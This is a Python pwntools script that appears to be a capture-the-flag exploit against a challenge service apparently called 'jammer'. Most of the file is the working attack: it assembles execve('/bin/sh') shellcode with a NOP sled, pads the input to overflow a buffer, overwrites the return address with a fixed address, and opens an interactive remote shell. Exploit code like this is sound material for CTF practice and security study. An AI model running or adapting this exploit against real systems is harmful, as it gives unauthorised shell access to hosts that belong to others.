from pwn import *

from dataclasses import dataclass

context.terminal = ['kitty']
context.arch = 'amd64'


import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8001",
                    nargs="?", help="Address of challenge")
args = parser.parse_args()
HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
#r = process("finals/handouts/jammer/handout/challenge")

@dataclass
class Server:
    name: str

SERVERS = []


def parseResponse(resp: bytes):
    resplen = u16(resp[:2])
    resp = resp[2:]
    assert resplen == len(resp) - 1
    while len(resp) > 0:
        if resp.startswith(b'server:'):
            resp = resp[7:]
            info_end = resp.index(b':')
            server_name = resp[:info_end].decode('charmap')
            resp = resp[info_end+1:]
            SERVERS.append(Server(name=server_name))
        elif resp.startswith(b'instance:'):
            resp = resp[9:]

        elif resp == b'\x00':
            print("Response end")
            break
        else:
            print(f"Unknown entry: {resp}")



#def queryAll():
#    r.sendline(b'\x01')
#    r.readline()
#    r.readuntil(b'\x05')
#    parseResponse(r.read())

sclen = 87

shellcode = b'\x90'*14 + asm('''
mov rcx, 0x1168732f6e69622f;
                             shl rcx, 0x08;
                             shr rcx, 0x08
                             push rcx;
                             xor rax, rax;
                             mov al, 0x3b;
                             xor rdx, rdx;
                             xor rsi, rsi;
                             mov rdi, rsp;
                             syscall;
                             ''')

assert len(shellcode) <= sclen

def queryOne(name: bytes):
    r.sendline(b'\x03?' + shellcode + b'A'*(sclen - len(shellcode)) + p64(0x4019fd) + b'B'*8 + b'C'*8)

#queryAll()
queryOne(b'1')

r.interactive()
